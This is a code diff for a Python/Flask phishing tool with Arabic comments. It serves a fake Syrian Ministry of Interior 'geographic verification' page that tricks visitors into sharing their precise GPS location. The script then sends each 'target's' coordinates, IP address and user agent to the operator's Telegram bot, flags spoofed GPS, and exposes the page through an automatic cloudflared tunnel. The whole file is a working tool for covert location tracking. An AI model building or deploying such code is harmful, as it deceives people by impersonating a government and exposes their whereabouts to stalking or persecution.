@@ -3,21 +3,44 @@ import subprocess
 import time
 import base64
 import json
-import requests
 import re
+import sys
+
+# --- 1. مرحلة التثبيت الآلي وتصحيح المسارات ---
+def boot_system():
+    print("\033[96m[*] جاري فحص البيئة وتجهيز المحركات...\033[0m")
+    
+    # تثبيت مكتبات بايثون
+    for lib in ['flask', 'requests']:
+        try:
+            __import__(lib)
+        except ImportError:
+            print(f"\033[93m[!] تثبيت مكتبة {lib}...\033[0m")
+            subprocess.run([sys.executable, "-m", "pip", "install", lib])
+
+    # تثبيت الأدوات الخارجية في Termux
+    try:
+        # استخدام command -v كبديل لـ which لتجنب الخطأ الظاهر في صورتك
+        check = subprocess.run("command -v cloudflared", shell=True, capture_output=True)
+        if check.returncode != 0:
+            print("\033[93m[!] أداة cloudflared مفقودة. جاري التثبيت...\033[0m")
+            subprocess.run("pkg install cloudflared php -y", shell=True)
+    except:
+        pass
+
+boot_system()
+
 from flask import Flask, request, render_template_string
+import requests
 
 app = Flask(__name__)
-
-# إعدادات الألوان والملفات
 RED, GREEN, CYAN, YELLOW, END = '\033[91m', '\033[92m', '\033[96m', '\033[93m', '\033[0m'
 CONFIG_FILE = ".env_config.json"
-LOG_FILE = "captured_intelligence.txt"
 
 def get_config():
     if os.path.exists(CONFIG_FILE):
         with open(CONFIG_FILE, "r") as f: return json.load(f)
-    print(f"{CYAN}⚙️ إعدادات التلجرام:{END}")
+    print(f"{CYAN}⚙️ إعدادات التلجرام لأول مرة:{END}")
     token = input(f"{YELLOW}  [>] Bot Token: {END}").strip()
     chat_id = input(f"{YELLOW}  [>] Chat ID: {END}").strip()
     config = {"token": token, "chat_id": chat_id}
@@ -25,13 +48,12 @@ def get_config():
     return config
 
 config = get_config()
-TELEGRAM_TOKEN = config["token"]
-CHAT_ID = config["chat_id"]
+TOKEN, CID = config["token"], config["chat_id"]
 
-def send_to_telegram(message):
+def send_to_tg(msg):
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                      json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
     except: pass
 
 HTML_TEMPLATE = """
@@ -39,36 +61,29 @@ HTML_TEMPLATE = """
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>بوابة التحقق الأمني</title>
+    <title>بوابة وزارة الداخلية - الاستعلام الأمني</title>
     <style>
-        body { font-family: Arial; background: #0b0e14; color: white; text-align: center; padding: 50px; }
-        .card { background: #151921; max-width: 400px; margin: auto; padding: 30px; border-radius: 12px; border: 1px solid #232933; }
-        .btn { background: #1a73e8; color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
+        body { font-family: Arial; background: #0b0e14; color: white; text-align: center; padding: 40px; }
+        .card { background: #151921; max-width: 400px; margin: auto; padding: 30px; border-radius: 15px; border: 2px solid #1a73e8; }
+        .btn { background: #1a73e8; color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>نظام الاستعلام الموحد</h2>
-        <p>يجب السماح بالوصول للموقع للتأكد من النطاق الجغرافي القانوني.</p>
-        <button class="btn" onclick="grab()">بدء التحقق</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Logo_of_the_Ministry_of_Interior_Syria.png" width="80">
+        <h2>نظام التحقق الجغرافي</h2>
+        <p>لتأمين دخولك القانوني، يرجى السماح بمشاركة الموقع الجغرافي لمطابقته مع النطاق المحلي.</p>
+        <button class="btn" onclick="track()">بدء المطابقة الآن</button>
     </div>
     <script>
-        function grab() {
+        function track() {
             navigator.geolocation.getCurrentPosition(p => {
-                // فك تشفير البيانات وإضافة بصمة كشف التزييف
-                let isMock = (p.coords.accuracy <= 1) ? "⚠️ مشبوه (دقة ثابتة)" : "✅ حقيقي";
-                let d = {
-                    lat: p.coords.latitude, 
-                    lon: p.coords.longitude, 
-                    acc: p.coords.accuracy, 
-                    mock: isMock,
-                    ua: navigator.userAgent
-                };
+                let mock = (p.coords.accuracy <= 1) ? "⚠️ مشبوه (Fake GPS)" : "✅ حقيقي";
+                let d = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy, mock: mock, ua: navigator.userAgent };
                 fetch('/log?d=' + btoa(JSON.stringify(d))).then(() => {
-                    alert("تم التحقق.");
-                    window.location.href = "https://moi.gov.sy";
+                    alert("تمت المطابقة بنجاح."); window.location.href = "https://moi.gov.sy";
                 });
-            }, () => alert("الإذن مطلوب."), {enableHighAccuracy: true});
+            }, () => alert("يجب السماح بالوصول للموقع للمتابعة."), {enableHighAccuracy: true});
         }
     </script>
 </body>
@@ -84,24 +99,32 @@ def log():
     if d_enc:
         data = json.loads(base64.b64decode(d_enc).decode('utf-8'))
         map_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
-        
-        # التقرير الاستخباراتي مع كشف التزييف
         report = (
             f"🎯 *تم رصد هدف جديد*\n\n"
-            f"📍 *الموقع:* [فتح الخريطة]({map_url})\n"
-            f"🛡️ *حالة الموقع:* {data['mock']}\n"
+            f"📍 [اضغط لفتح الخريطة]({map_url})\n"
+            f"🛡️ *الحالة:* {data['mock']}\n"
             f"📡 *الدقة:* {data['acc']} متر\n"
             f"🌐 *IP:* `{request.remote_addr}`"
         )
-        send_to_telegram(report)
-        print(f"{GREEN}[+] تم الإرسال للتلجرام بنجاح!{END}")
+        send_to_tg(report)
+        print(f"{GREEN}[+] تم إرسال البيانات للتلجرام.{END}")
     return "OK"
 
 if __name__ == "__main__":
-    # تشغيل Cloudflared آلياً
+    if os.path.exists("tunnel.log"): os.remove("tunnel.log")
+    print(f"{CYAN}[*] جاري إنشاء نفق التوصيل...{END}")
     subprocess.Popen("cloudflared tunnel --url http://127.0.0.1:8080 > tunnel.log 2>&1", shell=True)
-    time.sleep(8)
-    with open("tunnel.log", "r") as f:
-        url = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', f.read())
-        if url: print(f"{GREEN}🔗 الرابط الفعال: {url[0]}{END}")
+    
+    time.sleep(15) # وقت كافٍ لاستقرار الإنترنت
+    
+    try:
+        with open("tunnel.log", "r") as f:
+            urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', f.read())
+            if urls:
+                print(f"{GREEN}🚀 النظام جاهز. الرابط العام: {urls[0]}{END}")
+                send_to_tg(f"🛡️ *النظام متصل*\n\nالرابط للهدف:\n`{urls[0]}`")
+            else:
+                print(f"{RED}[!] لم يتم الحصول على الرابط. تحقق من اتصالك.{END}")
+    except: pass
+
     app.run(host='0.0.0.0', port=8080)
